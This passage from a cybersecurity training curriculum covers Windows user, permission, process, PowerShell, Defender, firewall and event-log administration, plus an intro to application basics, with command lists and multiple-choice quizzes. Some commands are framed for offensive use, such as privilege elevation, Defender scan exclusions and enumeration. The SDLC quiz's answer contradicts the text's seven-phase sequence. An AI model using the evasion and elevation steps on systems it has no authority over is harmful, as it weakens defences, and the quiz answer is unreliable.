**Key Points:**

- net user (no arguments) lists every local account; net user <username> shows one account's details
- net user testuser Pass@123 /add creates a new local account; net user testuser /del deletes one
- whoami prints the current identity in DOMAIN\Username format — the fastest way to confirm domain vs local context, or to verify current privileges during enumeration/red teaming
- wmic useraccount get name,sid,status lists all accounts with their SIDs and status; wmic useraccount where "LocalAccount=True" get name,sid filters to local-only accounts — useful for SID lookups and privilege analysis
- net localgroup lists all local groups; net localgroup administrators shows that group's members
- net localgroup administrators testuser /add elevates a user into the Administrators group; net localgroup administrators testuser /delete removes them
- UAC prompts for consent/credentials before an action runs with admin rights
- Group Policy (GPO) pushes centralized configuration/security settings across domain-joined machines

```bash
net user
net user testuser Pass@123 /add
whoami
wmic useraccount get name,sid,status
net localgroup administrators
net localgroup administrators testuser /add
net user <username>
net user testuser /del
wmic useraccount where "LocalAccount=True" get name,sid
net localgroup administrators testuser /delete
```

**Resources:**

- [Microsoft Learn: net user](https://learn.microsoft.com/windows-server/administration/windows-commands/net-user) _(link)_
- [Microsoft Learn: Active Directory Domain Services](https://learn.microsoft.com/windows-server/identity/ad-ds/get-started/adds-getting-started) _(link)_

**Quick Quiz:**

1. What does UAC (User Account Control) do?
   - **Prompts for consent/credentials before running an action with admin rights** ✓
   - Automatically grants admin rights to every logged-in user
   - Blocks all software installation permanently
   - Replaces the need for a Windows password entirely
   > UAC interrupts privileged actions with a consent or credential prompt, acting as a guard rail against unauthorised elevation.
2. Which command adds a new local user account from CMD?
   - **net user testuser Pass@123 /add** ✓
   - net localgroup testuser /add
   - whoami /add
   - icacls testuser /add
   > net user <name> <password> /add creates a new local user account with the given credentials.
3. What does Group Policy (GPO) primarily do in a domain environment?
   - **Pushes centralized configuration/security settings across domain-joined machines** ✓
   - Encrypts local hard drives automatically
   - Replaces Windows Defender
   - Manages DNS records only
   > GPOs centrally distribute configuration and security settings to all machines joined to the domain.

#### 45. Windows ACL (Access Control List) & icacls `[theory]` — Week 4

ACLs manage permissions for users, groups, and systems on objects like files, folders, registry keys, and network resources, via DACLs (who can do what) and SACLs (what gets audited). Permissions can be inherited from a parent object down to its children — e.g. a folder's permissions cascade to its subfolders and files — and every object has an owner who controls its DACL. icacls manages ACLs from CMD (view, grant/revoke, backup/restore); Set-Acl does the same programmatically from PowerShell for advanced scripting; and SACL-based auditing, configured via secpol.msc, logs access attempts for security monitoring.

**Key Points:**

- DACL (Discretionary ACL): permissions for users/groups, managed by the object's owner or administrators (e.g. Read/Write/Modify on a file)
- SACL (System ACL): auditing rules that track access attempts for security monitoring (e.g. logging failed access attempts to a file)
- ACEs (Access Control Entries) are the individual rules inside an ACL — e.g. one ACE granting the user JohnDoe Read access
- SIDs (Security Identifiers) uniquely identify users/groups/computers and are what ACEs actually reference
- Inheritance: permissions cascade from a parent object to its children — a folder's permissions are inherited by its subfolders and files
- Ownership: every object has an owner, who can modify the DACL to grant or deny access
- GUI path: right-click a file/folder -> Properties -> Security tab, to view/edit permissions
- SACLs are configured via Local Security Policy (secpol.msc) -> Local Policies -> Audit Policy -> Audit Object Access; icacls /save and /restore back up and roll back an ACL, while Get-Acl/Set-Acl do the same programmatically in PowerShell

```bash
icacls "C:\example\file.txt"
icacls "C:\example\file.txt" /grant JohnDoe:R
icacls "C:\example\file.txt" /remove JohnDoe
icacls "C:\example" /save "C:\acl_backup.txt"
$acl = Get-Acl "C:\example\file.txt"
$permission = New-Object System.Security.AccessControl.FileSystemAccessRule("JohnDoe", "Read", "Allow")
$acl.SetAccessRule($permission)
Set-Acl "C:\example\file.txt" $acl
icacls "C:\example" /restore "C:\acl_backup.txt"
secpol.msc
```

**Resources:**

- [Microsoft Learn: icacls](https://learn.microsoft.com/windows-server/administration/windows-commands/icacls) _(link)_
- [SS64 PowerShell: Get-Acl](https://ss64.com/ps/get-acl.html) _(link)_

**Quick Quiz:**

1. What is the difference between a DACL and a SACL?
   - **DACL controls user/group permissions; SACL controls auditing configuration** ✓
   - DACL controls auditing; SACL controls permissions
   - Both control identical settings
   - DACL only applies to registry keys
   > The Discretionary ACL governs who can access a resource, while the System ACL governs what access attempts get audited/logged.
2. What uniquely identifies a user or group independent of display name in Windows ACLs?
   - **SID (Security Identifier)** ✓
   - ACE
   - DACL
   - The file's GUID
   > A SID uniquely and permanently identifies a user or group, independent of any display name changes.
3. Which command grants a specific user Read permission on a file via CMD?
   - **icacls "file.txt" /grant User:R** ✓
   - icacls "file.txt" /deny User:R
   - net user file.txt /grant
   - chmod 744 file.txt
   > icacls's /grant option assigns the specified permission (R for read) to a named user on a file or folder.

#### 46. Processes & Services (tasklist, taskkill, sc, services.msc) `[theory]` — Week 4

The Windows equivalents of ps/kill/systemctl — tasklist/taskkill for processes, sc/services.msc for services. Most of these tools also work against a remote machine when given credentials, which matters when triaging a box you can't sit in front of directly. taskkill can target a process by PID or by executable name, force-kill it along with its child processes, or kill several PIDs in a single call.

**Key Points:**

- taskkill /F /T /IM forces termination of a process and its child-process tree
- taskkill /IM notepad.exe kills a process by its executable name; taskkill /PID <pid> /F force-kills a specific process by its numeric ID
- taskkill /PID 1234 /PID 5678 /F kills multiple processes by PID in a single command
- sc query shows a service's current state (e.g. RUNNING/STOPPED)
- tasklist /fo table formats output as a readable table; tasklist /s <remote> /u <user> /p <pass> queries processes on a remote machine
- Get-Process -Name notepad filters to a specific process by name instead of listing everything
- sc query <service> /S <remote> /U <user> /P <pass> queries a service's status on a remote system

```bash
tasklist
tasklist | findstr "notepad"
taskkill /IM notepad.exe
taskkill /F /T /IM notepad.exe
taskkill /PID 1234 /PID 5678 /F
Get-Process | Sort-Object -Property CPU -Descending
sc query wuauserv
Get-Service -Name "wuauserv"
Restart-Service -Name "wuauserv"
tasklist /fo table
taskkill /PID 1234 /F
Get-Process -Name notepad
```

**Resources:**

- [Microsoft Learn: tasklist](https://learn.microsoft.com/windows-server/administration/windows-commands/tasklist) _(link)_
- [SS64 PowerShell reference](https://ss64.com/ps/) _(link)_

**Quick Quiz:**

1. Which switch combination on taskkill forces termination of a process and its child-process tree?
   - **/F /T /IM** ✓
   - /S /Q
   - /A /L
   - /X /Y
   > /F forces termination, /T also kills child processes, and /IM specifies the image name of the process to kill.
2. Which command shows a Windows service's current state (e.g. RUNNING/STOPPED)?
   - **sc query** ✓
   - tasklist
   - taskkill
   - dir /a
   > sc query reports a service's current state directly from the command line.
3. Which PowerShell cmdlet lists running processes sorted by CPU usage?
   - **Get-Process | Sort-Object -Property CPU -Descending** ✓
   - Get-Service -Name
   - sc query
   - Restart-Service
   > Piping Get-Process into Sort-Object on the CPU property in descending order ranks processes by CPU consumption.

#### 47. PowerShell Essentials (Get-Help, Get-Command, Get-Process, Invoke-Expression) `[theory]` — Week 4

PowerShell is an object-oriented shell built on .NET — far more powerful for scripting/automation than legacy CMD, and heavily used offensively (and defensively) in Windows environments. Get-Command discovers everything available in the current session — cmdlets, functions, aliases, workflows, and executables — and can search by name/functionality or trace a cmdlet back to its source module; Get-Help then documents syntax, parameters, and usage examples for anything Get-Command turns up. Beyond basic discovery, help documentation itself needs to be downloaded once via Update-Help before -Examples output is fully useful.

**Key Points:**

- Get-Command lists cmdlets, functions, aliases, workflows, and executables available in the current session — e.g. Get-Command *service* searches by name/functionality
- Get-Help shows usage and examples for any cmdlet (e.g. Get-Help Get-Service, or Get-Help Get-Service -Examples)
- Execution Policy controls whether scripts can run at all (RemoteSigned is a common safe default)
- Invoke-Expression executes a string as PowerShell code — powerful, and a common living-off-the-land technique
- Update-Help downloads the latest cmdlet documentation so Get-Help -Examples returns useful output
- Get-Command Get-Service | Select-Object -Property ModuleName traces a cmdlet back to the module that defines it
- Set-ExecutionPolicy supports multiple levels (Restricted, RemoteSigned, Unrestricted) to control which scripts are allowed to run and prevent unauthorized/harmful scripts from executing
- Set-ExecutionPolicy Unrestricted -Force removes script-execution restrictions entirely (requires admin) — useful to recognise as a red flag on a system you're assessing

```bash
Get-Command *service*
Get-Help Get-Service
Get-Help Get-Service -Examples
Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned
Invoke-Expression "Get-Date"
Update-Help
Get-Command Get-Service | Select-Object -Property ModuleName
Set-ExecutionPolicy Unrestricted -Force
```

**Resources:**

- [Microsoft PowerShell Docs](https://learn.microsoft.com/powershell/) _(link)_
- [SS64 PowerShell reference](https://ss64.com/ps/) _(link)_

**Quick Quiz:**

1. Which cmdlet shows usage examples for another cmdlet?
   - **Get-Help <cmdlet> -Examples** ✓
   - Get-Command <cmdlet>
   - Get-Process <cmdlet>
   - Invoke-Expression <cmdlet>
   > Get-Help with the -Examples switch shows practical usage examples for a given cmdlet.
2. What does Invoke-Expression do, and why is it notable from a security standpoint?
   - **It executes a string as PowerShell code - a common living-off-the-land technique** ✓
   - It only displays help text for a command
   - It permanently disables the execution policy
   - It only works against remote machines
   > Invoke-Expression runs arbitrary text as PowerShell code, which makes it powerful for automation but also a favourite living-off-the-land technique.
3. What does the Execution Policy control in PowerShell?
   - **Whether scripts are allowed to run at all** ✓
   - The color scheme of the console
   - Which cmdlets are installed
   - The network ports PowerShell can use
   > Execution Policy (e.g. RemoteSigned) governs whether and under what conditions PowerShell scripts are permitted to run.

#### 48. CMD Essentials (ipconfig, netstat, nslookup, systeminfo, hostname, wmic) `[theory]` — Week 4

Classic CMD and PowerShell tools for quick system and network reconnaissance on a Windows host — from basic IP configuration through DNS resolution and active connection monitoring. netstat in particular breaks down into three views: active connections, listening ports, and per-protocol statistics.

**Key Points:**

- systeminfo dumps a full inventory of OS, patches, and hardware in one command
- wmic queries WMI directly for hardware/software details from the command line
- ipconfig /release and /renew request a new DHCP-assigned IP; ipconfig /flushdns clears the local DNS cache — all classic connectivity-troubleshooting steps
- Get-NetIPConfiguration is the PowerShell equivalent of ipconfig with more detail (e.g. DNS server addresses, interface indexes), useful for scripting
- netstat -an shows all active connections and listening ports; netstat -ano adds the owning process ID; netstat -s displays per-protocol statistics, complementing -an/-ano for diagnostics
- netstat -an is the standard way to check for unusual connections that might indicate malware activity; on a server it also shows which ports are actively in use by running services
- nslookup queries a specific DNS server directly (nslookup domain 8.8.8.8) and can pull specific record types (-type=mx); Resolve-DnsName is the more detailed PowerShell equivalent, including TTL values

```bash
ipconfig /all
systeminfo
hostname
wmic product get name,version
wmic cpu get name,maxclockspeed
ipconfig /release
ipconfig /renew
ipconfig /flushdns
Get-NetIPConfiguration
netstat -an
netstat -ano
netstat -s
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
nslookup www.example.com 8.8.8.8
nslookup -type=mx example.com
Resolve-DnsName example.com -Type MX
```

**Resources:**

- [SS64.com CMD reference](https://ss64.com) _(link)_
- [Microsoft Learn: systeminfo](https://learn.microsoft.com/windows-server/administration/windows-commands/systeminfo) _(link)_

**Quick Quiz:**

1. Which command dumps a full inventory of OS version, patches, and hardware in one shot?
   - **systeminfo** ✓
   - hostname
   - ipconfig /all
   - wmic cpu get name
   > systeminfo produces a complete summary of OS details, patch level, and hardware in a single command.
2. Which command queries WMI directly for hardware/software details from the command line?
   - **wmic** ✓
   - systeminfo
   - hostname
   - ipconfig
   > wmic queries Windows Management Instrumentation directly, e.g. wmic cpu get name,maxclockspeed.
3. Which command shows full network adapter configuration details, including DNS servers?
   - **ipconfig /all** ✓
   - hostname
   - systeminfo
   - wmic product get name
   > ipconfig /all shows the complete network configuration for every adapter, including assigned DNS servers.

#### 49. Windows Defender & Windows Firewall `[theory]` — Week 4

Windows' built-in AV/EDR (Defender) and host firewall — you'll need to query and sometimes tune both when operating on a Windows target or lab VM. Defender can be managed via the Windows Security app, PowerShell, Command Prompt (MpCmdRun.exe), Group Policy, or enterprise tools like Intune/SCCM; the Firewall is managed via its Control Panel applet (firewall.cpl) or that same PowerShell/CMD toolset. Both tools support full lifecycle management from the command line: checking status, adjusting exclusions/rules, updating signatures, and reversing a change.

**Key Points:**

- Defender: real-time protection against viruses/ransomware/spyware, integrates with Intune/SCCM in enterprise
- Firewall: profile-based (Domain/Private/Public) inbound/outbound rule engine
- Get-MpPreference views current Defender configuration; Set-MpPreference -ExclusionPath adds a folder Defender will skip scanning — a common technique both admins and attackers use
- MpCmdRun.exe -SignatureUpdate updates malware definitions from the command line; MpCmdRun.exe -Scan -ScanType 2 runs a full scan (-ScanType 1 is a quick scan)
- MpCmdRun.exe -Restore -ListAll lists quarantined items Defender has isolated
- firewall.cpl opens the Windows Firewall Control Panel GUI — enable/disable the firewall per network profile (Domain/Private/Public), allow apps through, or reset settings to default
- netsh advfirewall firewall delete rule name="..." removes a firewall rule by name from CMD
- Group Policy (GPO), Microsoft Intune, and System Center Configuration Manager (SCCM) extend Defender configuration and monitoring across domain-joined devices and enterprise endpoints

```bash
Get-MpComputerStatus
Update-MpSignature
MpCmdRun.exe -Scan -ScanType 1
MpCmdRun.exe -Scan -ScanType 2
MpCmdRun.exe -SignatureUpdate
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule name="Allow HTTP" protocol=TCP dir=in localport=80 action=allow
Get-NetFirewallRule
Get-MpPreference
Set-MpPreference -ExclusionPath "C:\ExampleFolder"
MpCmdRun.exe -Restore -ListAll
firewall.cpl
netsh advfirewall firewall delete rule name="Allow HTTP"
New-NetFirewallRule -DisplayName "Allow HTTP" -Protocol TCP -LocalPort 80 -Direction Inbound -Action Allow
Remove-NetFirewallRule -DisplayName "Allow HTTP"
```

**Resources:**

- [Microsoft Learn: Microsoft Defender Antivirus](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows) _(link)_
- [Microsoft Learn: Windows Firewall](https://learn.microsoft.com/windows/security/operating-system-security/network-security/windows-firewall/) _(link)_

**Quick Quiz:**

1. Which PowerShell cmdlet checks Windows Defender's current real-time protection status?
   - **Get-MpComputerStatus** ✓
   - Get-NetFirewallRule
   - Update-MpSignature
   - netsh advfirewall show allprofiles
   > Get-MpComputerStatus reports Windows Defender's current protection state and signature status.
2. How is the Windows Firewall's rule engine organised?
   - **By profile (Domain/Private/Public), each with its own inbound/outbound rules** ✓
   - By a single global rule set with no profiles
   - Only by application name, never by port
   - By CPU core assignment
   > Windows Firewall applies separate inbound/outbound rule sets depending on the active network profile: Domain, Private, or Public.
3. Which command adds a new inbound firewall rule allowing TCP port 80 via netsh?
   - **netsh advfirewall firewall add rule name="Allow HTTP" protocol=TCP dir=in localport=80 action=allow** ✓
   - netsh advfirewall show allprofiles
   - Get-NetFirewallRule -Direction In
   - MpCmdRun.exe -Scan -ScanType 1
   > This netsh advfirewall command explicitly creates a new inbound allow rule for TCP port 80.

#### 50. Event Viewer & Windows Log Analysis `[theory]` — Week 4

Windows logs almost everything of security interest into Event Viewer — filtering by Event ID is the fastest way to find the signal in thousands of log lines. A real training scenario illustrates this well: an employee's machine shut down immediately after every login. Filtering a saved .evtx log by Event ID 11707 (product installation successful) and 1033 (installation detail, including Product/Version/Manufacturer fields) revealed a suspicious installer (Totally_Legit_Software.msi) had just been run. Filtering by Event ID 4657 (registry key modification, which requires object-access auditing to be enabled) showed the malware had rewritten the HKCU\...\Run key to launch a shutdown command at every login, and Event ID 1074 (system shutdown/restart) confirmed the resulting forced shutdowns — three separate Event IDs stitched together into one incident timeline.

**Key Points:**

- Event ID 4624/4625: successful/failed logon — core for brute-force detection
- Event ID 4657: registry key modification (auditing must be enabled) — this is how a malicious Run-key persistence change gets caught
- Event ID 1074: system shutdown/restart initiated
- Event ID 11707: product/software installation completed successfully; Event ID 1033 gives the detailed install record (Product, Version, Language, Manufacturer) — useful for spotting an unexpected installer
- Saved .evtx log files can be loaded into Event Viewer (Action -> Open Saved Log) for offline analysis
- With thousands of log entries on a real system, filtering by specific Event IDs — not scrolling manually — is the only practical way to investigate
- Correlating several Event IDs by timestamp (install -> registry change -> shutdown) reconstructs the full incident timeline from otherwise-unrelated log entries

**Resources:**

- [Windows Event ID reference (ultimatewindowssecurity.com)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia) _(link)_
- [Microsoft Learn: Event Viewer](https://learn.microsoft.com/windows/win32/wes/eventviewer) _(link)_

**Quick Quiz:**

1. Which Event ID corresponds to a failed logon attempt, key for brute-force detection?
   - **4625** ✓
   - 4624
   - 1074
   - 4657
   > Event ID 4625 logs a failed logon attempt, which is the signal analysts watch for brute-force activity.
2. Which Event ID corresponds to a successful logon?
   - **4624** ✓
   - 4625
   - 1033
   - 1074
   > Event ID 4624 records a successful logon, paired with 4625 for failed logons.
3. Which Event ID logs a system shutdown/restart being initiated?
   - **1074** ✓
   - 4624
   - 4625
   - 4657
   > Event ID 1074 is logged when a system shutdown or restart is initiated.

#### 51. BitLocker & Disk Encryption `[theory]` — Week 4

BitLocker is Windows' built-in full-disk encryption feature, protecting data at rest if a device is lost or stolen. It is included from Windows 10/11 Pro upward (not Home) and is one of the flagship security features distinguishing Pro/Enterprise from consumer editions — Enterprise builds on it further with hardware-based protections like Credential Guard and Device Guard.

**Key Points:**

- Uses the TPM (Trusted Platform Module) to seal the encryption key to the specific hardware
- Without the recovery key, an encrypted drive's contents are unreadable even if physically removed
- Available from Windows 10/11 Pro upward (not Home); Enterprise adds further hardware-based protections like Credential Guard and Device Guard alongside it

```bash
manage-bde -status
manage-bde -on C:
```

**Resources:**

- [Microsoft Learn: BitLocker overview](https://learn.microsoft.com/windows/security/operating-system-security/data-protection/bitlocker/) _(link)_
- [Microsoft Learn: manage-bde](https://learn.microsoft.com/windows-server/administration/windows-commands/manage-bde) _(link)_

**Quick Quiz:**

1. What hardware component does BitLocker use to seal the encryption key to specific hardware?
   - **TPM (Trusted Platform Module)** ✓
   - GPU
   - CMOS battery
   - NIC (network card)
   > BitLocker seals its encryption key using the TPM, binding decryption to the specific hardware it was encrypted on.
2. What happens to an encrypted BitLocker drive's data if it is removed and read on another machine without the recovery key?
   - **The contents remain unreadable** ✓
   - The contents are automatically decrypted
   - The drive automatically reformats itself
   - The data is copied in plaintext to the new machine
   > Without the recovery key, BitLocker-encrypted data is unreadable even if the physical drive is moved to another machine.
3. Which command shows the current BitLocker encryption status of a volume?
   - **manage-bde -status** ✓
   - Get-MpComputerStatus
   - icacls C:
   - netsh advfirewall show allprofiles
   > manage-bde -status reports the BitLocker protection status of the system's volumes.

#### 52. Lab: PowerShell script to enumerate processes & users `[lab]` — Week 4

Write a PowerShell script that lists all running processes, local users, and scheduled tasks — the Windows counterpart to the M3-Linux bash enumeration lab. Sorting processes by CPU consumption surfaces the same 'what's eating my resources' view Task Manager's Performance tab gives, but scriptable and exportable.

**Key Points:**

- Get-Process for running processes
- Get-LocalUser (or net user) for local accounts
- Get-ScheduledTask for persistence/automation review
- Get-Process | Sort-Object -Property CPU -Descending surfaces the heaviest processes first — the same idea as Task Manager's Performance tab
- wmic process list brief is the older CMD-based equivalent, useful for comparison or on systems without PowerShell

```bash
Get-Process | Out-File C:\temp\Processes.txt
Get-LocalUser
Get-ScheduledTask | Select-Object TaskName,State
Get-Process | Sort-Object -Property CPU -Descending
wmic process list brief
```

**Resources:**

- [Microsoft PowerShell Docs](https://learn.microsoft.com/powershell/) _(link)_
- [SS64 PowerShell reference](https://ss64.com/ps/) _(link)_

**Quick Quiz:**

1. Which cmdlet lists all local user accounts in the enumeration script?
   - **Get-LocalUser** ✓
   - Get-Process
   - Get-ScheduledTask
   - Get-Service
   > Get-LocalUser (or net user) enumerates local user accounts on the machine.
2. Which cmdlet lists scheduled tasks for persistence/automation review?
   - **Get-ScheduledTask** ✓
   - Get-LocalUser
   - Get-Process
   - Get-Acl
   > Get-ScheduledTask lists configured scheduled tasks, useful for reviewing automation or persistence mechanisms.
3. Which cmdlet's output is redirected to a file with Out-File in this lab?
   - **Get-Process** ✓
   - Get-Help
   - Get-Command
   - Set-ExecutionPolicy
   > The lab pipes Get-Process into Out-File to save the running-processes list as a report file.

#### 53. TryHackMe: Windows Fundamentals Parts 1, 2, and 3 `[lab]` — Week 4

A guided TryHackMe room series covering Windows navigation, system settings, and administrative tools end-to-end — Part 1 in particular covers exactly the edition landscape you need to recognise in the field: Home vs Pro vs Enterprise vs Server, each targeting a different kind of user or workload.

**Key Points:**

- Part 1: OS structure, editions, and basic navigation — including the practical difference between Pro (BitLocker, Hyper-V, Group Policy), Enterprise (Defender ATP, AppLocker, Credential Guard), and Server (AD DS, DNS/DHCP, IIS) editions
- Part 2: System configuration, Control Panel, settings
- Part 3: User management, UAC, and administrative tools

**Resources:**

- [TryHackMe Windows Fundamentals](https://tryhackme.com) _(platform)_
- [Microsoft Docs](https://learn.microsoft.com) _(link)_

**Quick Quiz:**

1. Which part of the TryHackMe Windows Fundamentals series covers OS structure, editions, and basic navigation?
   - **Part 1** ✓
   - Part 2
   - Part 3
   - All three equally
   > Part 1 of the series introduces OS structure, editions, and basic navigation.
2. Which part covers user management, UAC, and administrative tools?
   - **Part 3** ✓
   - Part 1
   - Part 2
   - None of the parts
   > Part 3 focuses on user management, UAC, and administrative tools.
3. Which part covers system configuration, Control Panel, and settings?
   - **Part 2** ✓
   - Part 1
   - Part 3
   - All parts equally
   > Part 2 covers system configuration, Control Panel, and general settings.


---

## M4: Application Basics

**Month 2** · Week 5 · 10 topics

How modern web/mobile applications are actually built — frontend, backend, APIs, databases, sessions, and auth. Every web attack in M9/M10 is exploiting a gap in one of these building blocks, so understanding how they're supposed to work is the prerequisite for understanding how they break.

**Learning Outcomes:**

- Differentiate web, mobile, and thick-client applications and their attack surfaces
- Describe the SDLC and where security testing fits into it
- Explain how sessions/cookies maintain login state, and the flags that secure them
- Compare authentication methods (password, MFA, OAuth2) and authorization models (RBAC/ABAC)

**Module Resources:**

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org) _(link)_
- [PortSwigger Web Academy Intro](https://portswigger.net/web-security) _(platform)_
- [MDN Web Docs](https://developer.mozilla.org) _(link)_

**Module Quiz (10 questions):**

1. Which combination of cookie flags best protects a session cookie from both XSS-based theft and being sent over plaintext HTTP?
   - SameSite=Lax only
   - **HttpOnly + Secure** ✓
   - Domain + Path
   - Max-Age only
   > HttpOnly blocks JS access (XSS theft) and Secure ensures the cookie is only sent over HTTPS.
2. Which statement best explains why the SDLC's 'testing' phase should not be the only place security is addressed?
   - **Because shift-left security (e.g. SAST/code review earlier) catches issues cheaper and earlier than a pentest at the end** ✓
   - Because testing is optional in the SDLC
   - Because deployment happens before development
   - Because maintenance has no security relevance
   > Shift-left integrates security earlier (design/development) rather than relying solely on end-stage testing.
3. A pentester finds that a mobile app's PIN check logic is implemented entirely in the app's local code with no server-side re-check. What is the most accurate assessment?
   - This is secure because mobile apps can't be reverse engineered
   - **This is a security flaw since client-side/on-device logic can be bypassed via static analysis or patched** ✓
   - This is fine because APIs are always secure
   - Mobile apps cannot contain security logic at all
   > Mobile app logic partly runs on-device and can be statically analysed/tampered with, so critical checks must be enforced server-side.
4. Why is Broken Access Control fundamentally different from a failed login attempt?
   - **Access control governs authorization (what an authenticated user can do) whereas login governs authentication (who you are)** ✓
   - They are the same vulnerability
   - Access control only applies to APIs
   - Login failures are a subset of RBAC
   > Authentication answers 'who are you'; authorization (RBAC/ABAC) answers 'what are you allowed to do' -- access control flaws are authorization failures.
5. Which HTTP status code range indicates a client-side error, such as an unauthorized or malformed request?
   - 2xx
   - 3xx
   - **4xx** ✓
   - 5xx
   > 4xx codes (401, 403, 404) represent client errors, distinct from 3xx redirects and 5xx server errors.
6. Why does NoSQL injection require different payloads than SQL injection?
   - NoSQL databases don't accept any input
   - **NoSQL databases like MongoDB use JSON-like query operators (e.g. $ne, $gt) instead of SQL syntax** ✓
   - NoSQL databases are always encrypted
   - NoSQL databases don't run queries
   > MongoDB and similar NoSQL databases use operator-based queries, so injection payloads target those operators rather than SQL syntax.
7. Which of the following is the strongest reason OAuth2 misconfigured redirect URIs are dangerous?
   - **They can allow an attacker to intercept the authorization code/token by redirecting it to an attacker-controlled URL** ✓
   - They slow down the login process
   - They only affect HTTP status codes
   - They prevent MFA from being configured
   > A misconfigured/unvalidated redirect_uri lets an attacker redirect the auth code or token to a server they control, enabling account takeover.
8. A thick client application communicating directly with a database using hardcoded credentials embedded in the binary illustrates which risk?
   - A risk unique to web applications only
   - **A risk of thick clients having direct OS/DB access, exposing embedded secrets to reverse engineering** ✓
   - No risk since thick clients aren't network-based
   - A risk that only exists in REST APIs
   > Thick clients run natively with direct access to databases/OS, and embedded credentials can be extracted via binary analysis.
9. Which pairing correctly matches the security concept to the application-basics control?
   - **SameSite cookie flag mitigates CSRF (integrity of session use)** ✓
   - HttpOnly encrypts the database
   - REST is an authentication protocol
   - ABAC is a hashing algorithm
   > SameSite specifically blocks cross-site request forgery by controlling when cookies are sent cross-site.
10. Which statement about the relationship between frontend validation and backend enforcement is correct?
   - If frontend validation exists, backend validation is redundant
   - **Frontend validation is a UX feature; backend validation is the actual security control** ✓
   - Backend validation should be removed if the frontend already validates
   - Only mobile apps need backend validation
   > Since the client (frontend) is fully under the user's control, only server-side (backend) validation can be trusted as a security control.

### Topics

#### 54. Web vs Mobile vs Thick Client Applications `[theory]` — Week 5

Each application category has a different attack surface: web apps run mostly server-side logic behind HTTP, mobile apps ship logic to the device, thick clients run natively with direct OS/API access. The Application Basics module (per its own intro) exists to give you a working model of how a modern application is actually built — SDLC, frontend, backend, API, database, authentication/authorization, and cookies — before later modules teach you how to attack each of those pieces; where an app sits on the web/mobile/thick-client spectrum changes which of those pieces you can reach directly and which tooling (proxy vs static analysis vs traffic/binary analysis) applies.

**Key Points:**

- Web apps: browser-rendered, server does most of the work, tested via HTTP proxy (Burp)
- Mobile apps: logic partly on-device (APK/IPA), tested via static analysis + intercepting the app's API traffic
- Thick clients: full native desktop apps, often talk directly to a database or custom protocol, tested via binary/traffic analysis
- This distinction is the lens for everything else in the module: the same frontend/backend/API/database/auth/cookie building blocks exist in all three categories, just reachable through different interfaces

**Resources:**

- [OWASP Mobile Application Security](https://owasp.org/www-project-mobile-app-security/) _(link)_
- [MDN Web Docs](https://developer.mozilla.org) _(link)_
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) _(platform)_

**Quick Quiz:**

1. Which application type is typically tested primarily via an HTTP intercepting proxy like Burp Suite?
   - **Web application** ✓
   - Mobile application (APK)
   - Thick client application
   - IoT firmware
   > Web apps run mostly server-side logic behind HTTP, so testing is done via an HTTP proxy.
2. What distinguishes testing a mobile application from testing a web application?
   - **Mobile apps require static analysis of the app binary in addition to intercepting API traffic** ✓
   - Mobile apps have no attack surface
   - Mobile apps only communicate over UDP
   - Mobile apps cannot be tested with a proxy
   > Mobile apps ship logic to the device (APK/IPA), so testing combines static analysis with intercepting the app's backend API traffic.
3. A thick client application is best described as:
   - A browser-rendered app with server-side logic
   - **A native desktop application that may talk directly to a database or custom protocol** ✓
   - A stateless REST API
   - A markup language for styling
   > Thick clients run natively with direct OS/API access, often talking to a database or custom protocol directly, unlike web apps.

#### 55. Software Development Life Cycle (SDLC) `[theory]` — Week 5

SDLC is the systematic, repeatable process a team follows to ensure quality, consistency, and efficiency in building software. The real phase sequence is Planning -> Analysis -> Design -> Implementation -> Testing -> Deployment -> Maintenance, and the training material maps each phase to building a house: Planning is drawing the blueprint — concretely, setting goals, understanding what the user needs, and figuring out how long it will take and what resources are required; Analysis is asking the customer exactly what rooms/layout they want; Design is deciding floors/doors/windows, split between two roles — the developer decides how the software will work behind the scenes and the designer decides how the user interface will look; Implementation is construction brick by brick; Testing is inspecting doors/windows/plumbing/electricity; Deployment is handing over the keys; and Maintenance is the ongoing upkeep after move-in. Security in SDLC means embedding security practices into every one of these phases rather than bolting it on at the end, so vulnerabilities and risks are caught before they become costly issues.

**Key Points:**

- Seven phases, not six: Planning -> Analysis -> Design -> Implementation -> Testing -> Deployment -> Maintenance
- House-building analogy per phase: Planning=blueprint, Analysis=asking the customer what they want, Design=deciding floors/doors/windows, Implementation=construction, Testing=inspecting doors/windows/plumbing/electricity, Deployment=handing over the keys, Maintenance=ongoing upkeep
- Security-per-phase mapping from the source: Planning = identify security needs/compliance requirements; Analysis = risk assessment and threat modeling; Design = secure design principles (e.g. encryption, least privilege); Implementation = secure coding practices; Testing = security testing (penetration tests, code reviews); Deployment = secure configuration and patching; Maintenance = monitor for threats and apply timely updates
- The stated purpose of embedding security early is to identify vulnerabilities and risks before they become costly issues, ensuring the final product is secure from threats
- Deployment ('handing over the keys') is the point where the software starts being used under real-world conditions — any security gap missed earlier is now exposed to real users and attackers
- Maintenance never truly ends: any pentest target should be treated as a maintenance-phase snapshot of software that will keep changing, not a finished, static product
- Planning concretely means setting goals, understanding user needs, and estimating the time and resources required
- Design splits into two roles: the developer decides how the software works behind the scenes, the designer decides how the user interface will look

**Resources:**

- [OWASP SAMM](https://owaspsamm.org) _(link)_
- [Microsoft Security Development Lifecycle](https://www.microsoft.com/en-us/securityengineering/sdl) _(link)_
- [NIST Secure Software Development Framework](https://csrc.nist.gov/Projects/ssdf) _(link)_

**Quick Quiz:**

1. What does 'shift-left' security mean in the SDLC?
   - **Moving security testing earlier in the process (e.g. code review, SAST)** ✓
   - Only testing security right before deployment
   - Removing security testing altogether
   - Testing only in production
   > Shift-left means integrating security testing earlier in development rather than bolting it on at the end.
2. Which of the following correctly orders the SDLC phases?
   - Testing then Requirements then Design then Development then Deployment then Maintenance
   - **Requirements then Design then Development then Testing then Deployment then Maintenance** ✓
   - Design then Requirements then Deployment then Testing then Development
   - Deployment then Development then Testing then Requirements
   > The standard SDLC flow is Requirements, Design, Development, Testing, Deployment, then Maintenance.
3. DevSecOps primarily refers to:
   - Outsourcing all security testing to a third party
   - **Integrating automated security scanning directly into the CI/CD pipeline** ✓
   - Running a single pentest after deployment
   - Disabling developer access to production
   > DevSecOps embeds automated security scanning into the CI/CD pipeline rather than treating security as a separate final step.

